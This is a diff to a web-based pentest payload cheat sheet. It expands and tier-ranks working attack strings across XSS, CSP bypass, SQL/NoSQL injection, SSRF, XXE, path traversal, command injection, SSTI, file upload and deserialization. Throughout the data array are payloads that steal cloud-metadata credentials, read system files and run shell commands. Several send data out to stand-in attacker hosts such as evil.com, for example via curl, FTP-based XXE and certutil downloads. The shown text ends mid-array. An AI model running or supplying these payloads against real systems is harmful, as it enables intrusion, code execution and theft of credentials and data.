@@ -385,6 +385,28 @@
   .star { color: color-mix(in oklab, var(--fg) 35%, transparent); }
   .item.fav .star { color: var(--warn); text-shadow: 0 0 10px var(--warn); }
 
+  /* Precision tiers — universal (u) and likely-working (w) */
+  .item.tier-u { border-left-color: var(--accent); }
+  .item.tier-w { border-left-color: var(--accent-2); }
+  .item .badge {
+    display: inline-block; vertical-align: middle; margin-right: .45rem;
+    font-family: ui-monospace, monospace; font-size: .58rem; font-weight: 700;
+    letter-spacing: .08em; text-transform: uppercase; line-height: 1.4;
+    padding: .05rem .4rem; border-radius: 999px; white-space: nowrap;
+  }
+  .badge-u { color: #001; background: var(--accent); box-shadow: 0 0 12px -2px var(--accent); }
+  .badge-w {
+    color: var(--accent-2);
+    border: 1px solid color-mix(in oklab, var(--accent-2) 60%, transparent);
+    background: color-mix(in oklab, var(--accent-2) 12%, transparent);
+  }
+  .item .note {
+    margin-top: .4rem; font-size: .72rem; line-height: 1.4;
+    font-family: ui-sans-serif, system-ui, sans-serif;
+    color: color-mix(in oklab, var(--fg) 68%, transparent);
+  }
+  .item .note::before { content: "↳ "; opacity: .55; }
+
   .empty {
     text-align: center; padding: 3rem 1rem; opacity: .6; grid-column: 1/-1;
     font-family: ui-monospace, monospace;
@@ -509,6 +531,10 @@
       <span aria-hidden="true">★</span><span class="sr-only">Show favorites only</span>
     </button>
 
+    <button class="icon-btn" id="toggleWork" title="Show likely-working / universal payloads only" aria-pressed="false">
+      <span aria-hidden="true">⚡</span><span class="sr-only">Show likely-working payloads only</span>
+    </button>
+
     <button class="icon-btn" id="toggleScan" title="CRT scanlines" aria-pressed="false">
       <span aria-hidden="true">▤</span><span class="sr-only">Toggle scanlines</span>
     </button>
@@ -534,8 +560,8 @@
   <div class="stat-row" id="statRow">
     <div><b id="statCats">0</b> categories</div>
     <div><b id="statPayloads">0</b> payloads</div>
+    <div><b id="statPrecision">0</b> high-precision</div>
     <div><b>100%</b> offline</div>
-    <div><b id="statHardening">CSP+TT</b> hardened</div>
   </div>
 </section>
 
@@ -597,376 +623,340 @@
    DATA — curated reference, all static, all our control.
    ============================================================ */
 const DATA = [
+  { id:"universal", title:"Universal / Polyglot", icon:"🎯", sev:"crit", tags:["polyglot","universal","detect"],
+    desc:"Context-breaking polyglots and near-zero false-positive probes that fire or error across many sinks, engines, and parsers.", items:[
+    { p:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", t:"u", n:"0xsobky polyglot — breaks out of 20+ HTML / JS / attribute contexts in one string" },
+    { p:"'\"--></title></style></textarea></noscript></template><svg onload=alert()>", t:"u", n:"Closes the common reflection contexts, then fires" },
+    { p:"${{<%[%'\"}}%\\", t:"u", n:"SSTI super-probe — a parser error means the template engine is injectable (Jinja2/Twig/FM/Velocity/ERB)" },
+    { p:"SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", t:"u", n:"SQLi time-delay that triggers in string, numeric and comment contexts (MySQL)" },
+    { p:"1;sleep 5;#`sleep 5`$(sleep 5)|sleep 5", t:"u", n:"OS command-injection time probe across separator/quote contexts" },
+    { p:"\\u003cimg src=x onerror=alert()\\u003e", t:"w", n:"Unicode-escaped XSS for JSON / JS-string reflection sinks" },
+    { p:"'\"()&%<zZ><ScRiPt>alert(9)<\/ScRiPt>", t:"w", n:"Surfaces which special chars are reflected unfiltered + mixed-case tag" },
+    { p:"{{7*7}}${7*7}#{7*7}<%=7*7%>@(7*7)", t:"w", n:"Multi-engine SSTI fingerprint — read back which one evaluated" },
+    "%0d%0aX-Injected: 1",
+    "../../../../../../etc/passwd%00.png"
+  ]},
+
   { id:"xss", title:"XSS (Reflected / Stored)", icon:"⚡", sev:"high", tags:["injection","client","html"],
-    desc:"Core reflected & stored XSS — tag/attribute breakouts, event handlers, and polyglots.", items:[
-    "<script>alert(1)<\/script>",
-    "<img src=x onerror=alert(document.domain)>",
-    "<svg/onload=alert(1)>",
-    "\"><svg onload=confirm(1)>",
-    "javascript:alert(1)",
-    "'-alert(1)-'",
-    "<details open ontoggle=alert(1)>",
-    "<body onload=alert(1)>",
-    "<input autofocus onfocus=alert(1)>",
-    "<select autofocus onfocus=alert(1)>",
-    "<video src onloadstart=alert(1)>",
-    "<marquee onstart=alert(1)>",
-    "<a href=javascript:alert(1)>x</a>",
-    '<iframe srcdoc="<script>alert(1)<\/script>"></iframe>',
-    "';alert(String.fromCharCode(88,83,83))//",
-    "<math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">",
-    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
+    desc:"Creative HTML/attribute breakouts — interaction-free handlers, CSS-driven fires, and filter-evading tags.", items:[
+    { p:"<svg><animate onbegin=alert() attributeName=x dur=1s>", t:"w", n:"Fires with no user interaction; passes many tag blocklists" },
+    { p:"<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=alert()></xss>", t:"w", n:"No script scheme, no classic handler — CSS animation triggers JS" },
+    "<img src onerror=alert()>",
+    "\"><input autofocus onfocus=alert()>",
+    "<video><source onerror=alert()>",
+    "<svg><script href=data:,alert() />",
+    { p:"<iframe srcdoc=\"<img src=x onerror=parent.alert()>\">", n:"srcdoc sandbox reaching the parent context" },
+    { p:"<noscript><p title=\"</noscript><img src=x onerror=alert()>\">", t:"w", n:"mutation XSS — parser re-writes the markup after sanitisation" },
+    "<details ontoggle=alert() open>",
+    "<body onpageshow=alert()>",
+    { p:"<form><button formaction=javascript:alert()>X", n:"formaction runs javascript: on submit" },
+    "<a href=javascript:alert()>x</a>"
   ]},
+
   { id:"xss-dom", title:"DOM XSS / mXSS / Clobbering", icon:"🧬", sev:"high", tags:["client","dom","injection"],
-    desc:"Sink-based DOM XSS, mutation XSS, DOM clobbering, and sanitizer bypasses.", items:[
-    "#<img src=x onerror=alert(1)>   (location.hash -> innerHTML sink)",
-    "eval(location.hash.slice(1))",
-    "$(location.hash)   (jQuery selector -> HTML sink)",
-    "document.write(location.search)",
-    "element.setAttribute('href', userInput)   (javascript: sink)",
-    "<img name=currentScript src=x onerror=alert(1)>   (clobber document.currentScript)",
-    "<a id=x><a id=x name=y href=javascript:alert(1)>   (clobber x.y)",
-    "<form id=x><input id=y value=javascript:alert(1)>",
-    "<base href=//evil.com/>",
-    "<template shadowrootmode=open><img src=x onerror=alert(1)></template>",
-    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">   (mXSS)',
-    "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>   (mXSS)",
-    "<svg></p><style><a id=</style><img src=1 onerror=alert(1)></style>",
-    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>   (DOMPurify mXSS)",
-    "window.postMessage('<img src=x onerror=alert(1)>','*')"
+    desc:"Sink-driven DOM XSS, DOM clobbering gadgets, sanitizer mutation, and postMessage / window.name vectors.", items:[
+    { p:"#\"><img src=x onerror=alert()>", t:"w", n:"location.hash flowing into innerHTML" },
+    { p:"javascript:alert(document.domain)//", t:"w", n:"user-controlled href/src assigned to a DOM sink" },
+    "<img name=currentScript src=x onerror=alert()>",
+    "<a id=x><a id=x name=y href=javascript:alert()>",
+    { p:"<base href=//evil.com/>", t:"w", n:"clobbers relative script src to an attacker origin" },
+    { p:"<template shadowrootmode=open><img src=x onerror=alert()></template>", t:"w", n:"declarative Shadow DOM revives inert markup" },
+    { p:"?__proto__[transport_url]=data:,alert()", n:"prototype pollution feeding a client sink" },
+    "<script type=importmap>{\"imports\":{\"x\":\"//evil.com/x.js\"}}<\/script>",
+    { p:"eval(window.name)", n:"set window.name on the attacker page, then navigate to the sink" },
+    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert()>",
+    "window.postMessage('<img src=x onerror=alert()>','*')"
   ]},
+
   { id:"csp", title:"CSP Bypass", icon:"🛡️", sev:"med", tags:["client","bypass","defense"],
-    desc:"Defeating Content-Security-Policy — JSONP gadgets, base-uri, nonce reuse, strict-dynamic abuse.", items:[
-    "<script src=//accounts.google.com/o/oauth2/revoke?callback=alert(1)><\/script>   (JSONP gadget)",
-    "<script src=//www.google.com/complete/search?client=chrome&jsonp=alert(1)><\/script>",
-    "<base href=//evil.com/><script nonce=LEAKED src=app.js><\/script>",
+    desc:"JSONP & framework gadgets, base-uri hijack, dangling-markup exfil, and strict-dynamic abuse.", items:[
+    { p:"<script src=//www.google.com/complete/search?client=chrome&jsonp=alert(1)><\/script>", t:"w", n:"JSONP gadget on a commonly allow-listed origin" },
+    { p:"<base href=//evil.com/>", t:"w", n:"if base-uri is unset, hijacks every nonce'd relative script" },
     "ng-app ng-csp><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js><\/script>{{$on.curry.call().alert(1)}}",
     "<script src=\"data:text/javascript,alert(1)\"><\/script>",
-    "<object data=\"data:text/html,<script>alert(1)<\/script>\">",
-    "<script nonce=REUSED_NONCE>alert(1)<\/script>   (nonce reuse)",
-    "strict-dynamic: a trusted script does s=document.createElement('script');s.src='//evil';document.body.append(s)",
-    "<link rel=prefetch href=//evil.com/?leak>   (data exfil under connect-src)",
-    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
+    { p:"<img src='//evil.com/log?leak=", n:"dangling-markup — exfils following markup even under strict script-src" },
+    "<link rel=dns-prefetch href=//evil.com>",
+    "<meta http-equiv=refresh content=\"0;url=//evil.com?d=\">",
+    { p:"<object data=\"data:text/html,<script>alert(1)<\/script>\">", n:"object/embed can dodge script-src in some engines" },
+    "<script nonce=REUSED>alert(1)<\/script>"
   ]},
+
   { id:"sqli", title:"SQL Injection", icon:"🗃️", sev:"crit", tags:["injection","database","server"],
-    desc:"Auth bypass, UNION, error-based, blind boolean/time, OOB exfil, and WAF-tolerant syntax.", items:[
-    "' OR '1'='1' -- -",
-    "\" OR \"\"=\"",
-    "admin' -- -",
-    "') OR ('1'='1' -- -",
-    "' UNION SELECT NULL,version(),NULL -- -",
-    "1' ORDER BY 10 -- -",
-    "0 UNION ALL SELECT NULL,@@version,NULL,NULL -- -",
-    "' AND SLEEP(5) -- -",
-    "1' AND IF(1=1,SLEEP(5),0) -- -",
-    "'; WAITFOR DELAY '0:0:5' -- -   (MSSQL)",
-    "1') AND pg_sleep(5) -- -   (Postgres)",
-    "' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -   (error-based)",
-    "' AND 1=CONVERT(int,(SELECT @@version)) -- -   (MSSQL error)",
-    "1; EXEC xp_cmdshell('whoami') -- -",
-    "' or JSON_LENGTH('{}')<=8896 union select @@version#   (JSON WAF bypass)",
-    "'+(SELECT 1 FROM dual WHERE 1=1)+'   (Oracle)",
-    "'/**/UnIoN/**/SeLeCT/**/1,2,3-- -   (comment/case WAF bypass)"
+    desc:"Subquery/time-blind, double-query error extraction, JSON-function WAF evasion, and OOB DNS exfil.", items:[
+    { p:"'-(SELECT 1 FROM(SELECT SLEEP(3))x)-'", t:"w", n:"Quote-safe subquery time-blind (MySQL)" },
+    { p:"'||(SELECT IF(1=1,SLEEP(3),0))||'", t:"w", n:"Boolean→time in a string-concat context" },
+    { p:"1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", t:"w", n:"Double-query error leaks version even with output hidden" },
+    { p:"'+(SELECT CASE WHEN(1=1)THEN pg_sleep(3)ELSE pg_sleep(0)END)+'", n:"Postgres conditional time-blind" },
+    { p:"' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -", t:"w", n:"JSON functions slip past keyword-based WAFs" },
+    "1'/**/UnIoN/**/SeLeCt/**/@@version,2,3-- -",
+    { p:"' AND 5000=CONVERT(int,(SELECT @@version))-- -", n:"MSSQL error-based cast extraction" },
+    { p:"'; EXEC master..xp_dirtree '//evil.com/a'-- -", n:"MSSQL OOB — swap // for a UNC path to force SMB/DNS" },
+    { p:"'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)))||'", n:"Oracle OOB DNS exfil" },
+    "1);SELECT PG_SLEEP(3)-- -"
   ]},
+
   { id:"nosql", title:"NoSQL & ORM Injection", icon:"🍃", sev:"high", tags:["injection","database","nosql"],
-    desc:"Mongo operators, $where JS, regex extraction, and framework ORM leaks (Django, Ransack, Prisma).", items:[
-    '{"username":{"$ne":null},"password":{"$ne":null}}',
-    '{"username":{"$gt":""},"password":{"$gt":""}}',
-    '{"username":"admin","password":{"$regex":"^a"}}',
-    "username[$ne]=x&password[$ne]=x",
-    '{"$where":"sleep(5000)"}',
-    "';return true;var x='",
-    '{"username":{"$in":["admin","root"]},"password":{"$gt":""}}',
-    "password__startswith=pbkdf2_sha256$   (Django ORM leak)",
-    "?q[password_cont]=secret   (Ransack)",
-    '{"password":{"contains":"a"}}   (Prisma operator injection)',
-    '{"id":"10","id":"100"}   (duplicate key confusion)'
+    desc:"Operator auth bypass, blind extraction via $where/$regex, server-side JS, and ORM leak params.", items:[
+    { p:"{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}", t:"w", n:"Operator injection auth bypass (JSON body)" },
+    "username[$ne]=1&password[$ne]=1",
+    { p:"{\"$expr\":{\"$function\":{\"body\":\"function(){return true}\",\"args\":[],\"lang\":\"js\"}}}", t:"w", n:"Mongo 4.4+ $function runs server-side JavaScript" },
+    { p:"{\"username\":\"admin\",\"password\":{\"$regex\":\"^.{8}$\"}}", n:"length/char oracle for blind password extraction" },
+    "{\"$where\":\"this.password.match(/^a/)\"}",
+    { p:"password__startswith=argon2", n:"Django ORM boolean leak via lookup" },
+    "q[password_cont]=secret",
+    { p:"{\"password\":{\"startsWith\":\"$\"}}", n:"Prisma operator injection" },
+    "';return this.a!='"
   ]},
+
   { id:"ssrf", title:"SSRF", icon:"🌐", sev:"high", tags:["server","cloud","network"],
-    desc:"Cloud metadata (AWS/GCP/Azure/OCI/Alibaba), IP-format & encoding bypass, DNS rebind, gopher.", items:[
-    "http://127.0.0.1/",
-    "http://localhost:80/admin",
-    "http://[::1]/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-    "http://100.100.100.200/latest/meta-data/   (Alibaba)",
-    "http://169.254.169.254/opc/v2/instance/   (Oracle OCI)",
-    "http://2130706433/   (decimal)",
-    "http://0x7f000001/   (hex)",
-    "http://017700000001/   (octal)",
-    "http://[::ffff:169.254.169.254]/",
-    "http://allowed.com@169.254.169.254/",
-    "http://169.254.169.254#.allowed.com/",
-    "gopher://127.0.0.1:6379/_SET%20pwned%20true   (Redis via gopher)",
-    "dict://127.0.0.1:11211/stats",
-    "file:///etc/passwd",
-    "7f000001.a9fea9fe.rbndr.us   (DNS rebinding)"
+    desc:"Cloud metadata (v2), IP-format & parser-differential bypass, DNS rebinding, and gopher Redis.", items:[
+    { p:"http://169.254.169.254/latest/api/token", t:"w", n:"AWS IMDSv2 token endpoint (PUT) — creds sit behind it" },
+    { p:"http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/", n:"AWS IMDS over IPv6" },
+    { p:"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", t:"w", n:"GCP token (needs Metadata-Flavor: Google header)" },
+    { p:"http://425.510.425.510/latest/meta-data/", t:"w", n:"integer-overflow octets normalise to 169.254.169.254" },
+    { p:"http://target.com\\@169.254.169.254/", t:"w", n:"backslash breaks authority parsing — parser differential" },
+    { p:"http://①②⑦.⓪.⓪.①/", n:"Unicode-digit host defeats naive allow-list parsing" },
+    { p:"http://127.0.0.1.nip.io/  |  http://localtest.me/", t:"w", n:"public DNS names resolving to loopback" },
+    { p:"http://[::ffff:a9fe:a9fe]/latest/meta-data/", n:"IPv4-mapped IPv6 form of the metadata IP" },
+    { p:"gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A", t:"w", n:"gopher smuggles a Redis command (URL-encoded CRLF)" },
+    "dict://127.0.0.1:11211/stats"
   ]},
+
   { id:"xxe", title:"XXE", icon:"📄", sev:"high", tags:["injection","xml","server"],
-    desc:"File read, blind OOB exfil via parameter entities, PHP wrappers, and SVG/Office XXE.", items:[
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><r>&x;</r>",
-    "<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://attacker/x.dtd\"> %ext;]>",
-    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\"><!ENTITY % q \"<!ENTITY exfil SYSTEM 'http://a/?d=%p;'>\">%q;]>",
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><r>&x;</r>",
-    "<!DOCTYPE test [<!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\">%init;]>",
-    "<svg xmlns=\"http://www.w3.org/2000/svg\"><image xlink:href=\"file:///etc/hostname\"></svg>   (SVG XXE)",
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'expect://id'>]><r>&x;</r>",
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'netdoc:///etc/passwd'>]><r>&x;</r>"
+    desc:"Blind OOB over FTP, PHP-wrapper file read, XInclude without DOCTYPE, and SVG/Office XXE.", items:[
+    { p:"<!DOCTYPE r [<!ENTITY % d SYSTEM \"file:///etc/passwd\"><!ENTITY % e \"<!ENTITY &#x25; f SYSTEM 'ftp://evil.com/%d;'>\">%e;%f;]>", t:"w", n:"blind OOB over FTP — survives newlines in the target file" },
+    { p:"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", t:"w", n:"PHP wrapper base64 — binary-safe read of any file" },
+    { p:"<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>", t:"w", n:"XInclude — works when DOCTYPE is blocked" },
+    "<!DOCTYPE r [<!ENTITY % a SYSTEM \"http://evil.com/e.dtd\">%a;]>",
+    { p:"<svg xmlns=\"http://www.w3.org/2000/svg\"><image xlink:href=\"http://169.254.169.254/latest/meta-data/\"/></svg>", n:"SVG upload → SSRF/XXE to cloud metadata" },
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>",
+    { p:"office docx: edit word/document.xml, add external DTD, re-zip", n:"XXE via DOCX/XLSX (OOXML is a zip of XML)" }
   ]},
+
   { id:"lfi", title:"LFI / Path Traversal", icon:"📁", sev:"high", tags:["server","files","traversal"],
-    desc:"Encoding tricks, PHP wrappers, log poisoning, /proc, and null-byte truncation.", items:[
-    "../../../../etc/passwd",
-    "....//....//....//etc/passwd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%252f..%252f..%252fetc/passwd   (double URL-encode)",
-    "..%c0%af..%c0%afetc/passwd   (overlong UTF-8)",
-    "/etc/passwd%00.png   (null byte)",
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/read=string.rot13/resource=index.php",
-    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
-    "expect://id",
-    "/proc/self/environ   (log/env poisoning -> RCE)",
-    "/var/log/apache2/access.log",
-    "....\\....\\....\\windows\\win.ini",
-    "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    desc:"PHP filter-chain RCE, double-encoding, log/env poisoning, data:// wrapper, and UNC NTLM leaks.", items:[
+    { p:"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|...|resource=/etc/passwd", t:"w", n:"php_filter_chain_generator — RCE with no writable file" },
+    { p:"....//....//....//....//etc/passwd", t:"w", n:"recursive ../ defeats single-pass stripping" },
+    { p:"..%252f..%252f..%252fetc%252fpasswd", t:"w", n:"double URL-encode gets past decode-then-filter" },
+    { p:"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==", t:"w", n:"data:// wrapper → direct RCE when allow_url_include is on" },
+    { p:"php://filter/convert.base64-encode/resource=index.php", t:"w", n:"exfil source code without executing it" },
+    "/proc/self/environ",
+    "/proc/self/fd/0",
+    { p:"\\\\evil.com\\share\\x", t:"w", n:"UNC path → outbound NTLM auth leak (Windows)" },
+    "C:\\Windows\\win.ini",
+    "zip://uploaded.jpg%23shell.php"
   ]},
+
   { id:"rce", title:"Command Injection", icon:"💻", sev:"crit", tags:["injection","server","exec"],
-    desc:"Separators, blind/OOB triggers, $IFS & brace-expansion filter bypass, and Windows variants.", items:[
-    "; id",
-    "| id",
-    "&& whoami",
-    "`id`",
-    "$(id)",
-    "; cat /etc/passwd #",
-    "|| ping -c 3 collaborator.net",
-    "; curl http://attacker/$(whoami)",
-    "127.0.0.1; sleep 5",
+    desc:"Space/keyword-filter evasion via $IFS, brace expansion, char reconstruction, and OOB exfil.", items:[
+    { p:"cat$IFS$9/etc/passwd", t:"w", n:"$IFS replaces spaces to survive naive space filters" },
+    { p:"{cat,/etc/passwd}", t:"w", n:"brace expansion — no spaces at all" },
+    { p:"||curl${IFS}evil.com/$(whoami)||", t:"w", n:"space-free, quote-tolerant OOB exfil" },
+    "$(printf '\\x69\\x64')",
+    ";`rev<<<'di'`",
+    "$(tr '[A-Z]' '[a-z]'<<<'ID')",
     "%0aid",
-    ";{cat,/etc/passwd}   (brace expansion)",
-    "$IFS$9id   (space filter bypass)",
-    "$(printf '\\x69\\x64')   (hex-encoded 'id')",
-    "a]&&id||a[",
-    "& tasklist   (Windows)",
-    "| type C:\\Windows\\System32\\drivers\\etc\\hosts   (Windows)"
+    { p:"& certutil -urlcache -f http://evil/x x & ", n:"Windows LOLBin file download" },
+    { p:"|powershell -e <base64>", n:"Windows encoded-command execution" },
+    "a);sleep 5;echo("
   ]},
+
   { id:"ssti", title:"SSTI (Templates)", icon:"🧩", sev:"crit", tags:["injection","template","server"],
-    desc:"Detection to RCE across Jinja2, Twig, Freemarker, Velocity, Smarty, and Node engines.", items:[
-    "{{7*7}}",
-    "${7*7}",
-    "<%= 7*7 %>",
-    "#{7*7}",
-    "{{7*'7'}}   (Jinja2 vs Twig fingerprint)",
-    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-    "{{['id']|filter('system')}}   (Twig)",
-    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}   (Twig)",
-    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}   (Freemarker)",
-    "${T(java.lang.Runtime).getRuntime().exec('id')}   (Spring SpEL)",
-    "#set($x=$context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))   (Velocity/OGNL)",
-    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}   (Node)"
+    desc:"Short filter-friendly gadgets for Jinja2, Twig, Freemarker, SpEL, Nunjucks, Pug and Handlebars.", items:[
+    { p:"${{<%[%'\"}}%\\", t:"u", n:"engine-agnostic break probe — error = injectable" },
+    { p:"{{lipsum.__globals__.os.popen('id').read()}}", t:"w", n:"Jinja2 lipsum gadget — short and filter-friendly" },
+    { p:"{{cycler.__init__.__globals__.os.popen('id').read()}}", t:"w", n:"Jinja2 without needing config/self" },
+    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')}}",
+    { p:"{{['id']|filter('system')}}", t:"w", n:"Twig system filter" },
+    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+    { p:"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", t:"w", n:"Freemarker RCE" },
+    { p:"T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})", t:"w", n:"Spring SpEL argument-array RCE" },
+    { p:"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}", t:"w", n:"Nunjucks / Node RCE" },
+    "#{root.process.mainModule.require('child_process').execSync('id')}"
   ]},
+
   { id:"upload", title:"File Upload Bypass", icon:"📤", sev:"high", tags:["server","files","bypass"],
-    desc:"Extension & content-type tricks, magic-byte polyglots, and .htaccess / web.config overrides.", items:[
-    "shell.php.jpg   (double extension)",
-    "shell.phtml / shell.php5 / shell.phar",
-    "shell.pHp   (case trick)",
-    "shell.php%00.jpg   (null byte)",
-    "shell.php;.jpg / shell.asp;.jpg   (IIS semicolon)",
-    "shell.php::$DATA   (Windows ADS)",
-    "GIF89a;<?php system($_GET[0]);?>   (magic-byte polyglot)",
-    "Content-Type: image/jpeg on shell.php",
-    ".htaccess -> AddType application/x-httpd-php .jpg",
-    "web.config -> add handler mapping *.jpg to PHP/ASP",
-    "shell.svg -> <svg onload=alert(1)>",
-    "../../shell.php   (path traversal in filename)"
+    desc:"Handler-override configs, EXIF/magic-byte polyglots, trailing-char tricks, and multipart traversal.", items:[
+    { p:".htaccess → AddType application/x-httpd-php .gif", t:"w", n:"if .htaccess is uploadable, any .gif runs as PHP (Apache)" },
+    { p:"web.config → map *.gif to PageHandlerFactory", t:"w", n:"IIS RCE via uploaded config" },
+    { p:"exiftool -Comment='<?php system($_GET[0]);?>' pic.jpg", t:"w", n:"PHP in EXIF — becomes RCE when the image is later include()d" },
+    { p:"filename=\"../../var/www/html/shell.php\"", t:"w", n:"path traversal in the multipart filename field" },
+    "GIF89a;<?php system($_GET[0]);?>  saved as shell.php",
+    "shell.phtml / shell.pht / shell.php7 / shell.phar",
+    { p:"shell.php%00.jpg  |  shell.php.  |  shell.php%20", n:"null byte / trailing dot or space stripped after the check" },
+    "shell.svg → <svg onload=alert()> (stored XSS)",
+    "shell.asp;.jpg  (IIS semicolon)",
+    "zip-slip: ../../etc/cron.d/x inside the archive"
   ]},
-  { id:"deserial", title:"Deserialization", icon:"📦", sev:"crit", tags:["server","exec","deserialization"],
-    desc:"Java (ysoserial), .NET ViewState/JSON, PHP POP/phar, Python pickle, Ruby Marshal, Node.", items:[
-    "Java: ysoserial CommonsCollections5 'curl http://a/$(id)'",
-    "Java URLDNS gadget (blind detection): rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA...",
-    ".NET: ysoserial.net -g TypeConfuseDelegate -f Json.Net -c calc",
-    ".NET ViewState: ysoserial.net -p ViewState -g TextFormattingRunProperties -c cmd --generator=...",
-    "PHP: O:8:\"stdClass\":1:{s:4:\"data\";s:3:\"PoC\";}   (object injection / POP chain)",
-    "PHP phar: phar://uploaded.jpg   (metadata unserialize)",
-    "Python pickle: cos\\nsystem\\n(S'id'\\ntR.",
-    "Python YAML: !!python/object/apply:os.system ['id']",
-    "Ruby Marshal: \\x04\\x08o:...",
-    "Node node-serialize: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()"
+
+  { id:"deser", title:"Deserialization", icon:"📦", sev:"crit", tags:["server","exec","deserialization"],
+    desc:"ysoserial gadget chains, .NET ViewState/ObjectDataProvider, PHP phar POP, pickle & YAML RCE.", items:[
+    { p:"ysoserial CommonsCollections6 'curl evil.com/$(id)' | base64", t:"w", n:"no-branch gadget, works on modern JREs" },
+    { p:"ysoserial URLDNS 'http://x.burpcollaborator.net'", t:"w", n:"safe blind detection — DNS hit proves Java deser" },
+    { p:"ysoserial.net -g ObjectDataProvider -f Json.Net -c calc", t:"w", n:".NET Json.NET type-confusion RCE" },
+    { p:"__VIEWSTATE forged with leaked --validationkey/--decryptionkey", t:"w", n:".NET ViewState RCE when machineKey leaks" },
+    { p:"phar://uploaded.jpg/x  (POP chain in phar metadata)", t:"w", n:"PHP object injection with no unserialize() call" },
+    { p:"pickle: __reduce__ → (os.system,('id',))", t:"w", n:"Python pickle RCE" },
+    { p:"!!python/object/apply:os.system ['id']", t:"w", n:"PyYAML full_load RCE" },
+    "node-serialize: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()",
+    "Ruby Marshal universal RCE gadget (3.x)"
   ]},
-  { id:"protop", title:"Prototype Pollution", icon:"⚙️", sev:"high", tags:["client","node","injection"],
-    desc:"Client & server gadgets via query/JSON, and RCE through NODE_OPTIONS / EJS / child_process.", items:[
-    "?__proto__[admin]=true",
-    "?constructor[prototype][admin]=true",
-    '{"__proto__":{"isAdmin":true}}',
-    '{"constructor":{"prototype":{"isAdmin":true}}}',
-    "a[__proto__][polluted]=true",
-    "Object.assign({}, JSON.parse('{\"__proto__\":{\"x\":1}}'))",
-    '{"__proto__":{"status":510}}   (Express DoS gadget)',
-    '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}',
-    '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=evil.com"}}',
-    '{"__proto__":{"client":1,"escapeFunction":"1;return process.mainModule.require(\'child_process\').execSync(\'id\')"}}   (EJS RCE)'
+
